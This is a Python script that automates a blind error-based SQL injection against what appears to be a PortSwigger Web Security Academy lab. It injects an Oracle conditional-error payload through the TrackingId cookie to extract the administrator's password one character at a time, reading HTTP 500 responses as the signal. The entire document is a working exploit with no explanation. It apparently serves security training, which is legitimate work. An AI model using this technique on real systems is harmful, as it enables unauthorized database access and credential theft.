import requests
import urllib3
import urllib
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}
url='https://0a1800d704d146bc80ecc19c003b0014.web-security-academy.net/filter?category=Pets'
password_extracted = ""
for i in range(1,21):
	for j in range(32,126):
		payload="' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and ascii(substr(password,%s,1))='%s') || '"%(i,j)
		payload_encoded=urllib.parse.quote(payload)
		cookies={'TrackingId':'CDntDDWwfnfWWocf' + payload_encoded,'session':'vVMuIQ0R8Am45DT0PGkpGad1tWL8PSw8'}
		r = requests.get(url,cookies=cookies,verify=False, proxies=proxies)
		if r.status_code == 500:
			password_extracted += chr(j)
			sys.stdout.write('\r' + password_extracted)
			sys.stdout.flush()
			break
		else:
			sys.stdout.write('\r' + password_extracted + chr(j))
			sys.stdout.flush()
			